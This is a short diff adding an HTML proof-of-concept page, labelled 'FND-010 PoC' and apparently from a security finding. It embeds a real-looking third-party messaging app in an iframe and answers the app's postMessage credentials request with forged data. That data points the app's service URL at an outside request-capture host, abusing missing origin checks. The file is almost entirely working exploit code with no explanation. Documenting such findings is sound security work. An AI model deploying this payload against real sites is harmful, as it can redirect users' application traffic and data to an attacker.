@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head><title>FND-010 PoC</title></head>
+<body>
+<iframe id="f" src="https://messaging.telogis.com/rest/app/"></iframe>
+<script>
+var SERVER = "https://4jxj4rbz.instances.httpworkbench.com";
+window.addEventListener("message", function(e) {
+  if (e.data && e.data.type === "credentials_request") {
+    document.getElementById("f").contentWindow.postMessage({
+      type: "credentials",
+      data: { token: "x", serviceUrl: SERVER, userId: "x", customerName: "x" }
+    }, "*");
+  }
+});
+</script>
+</body>
+</html>
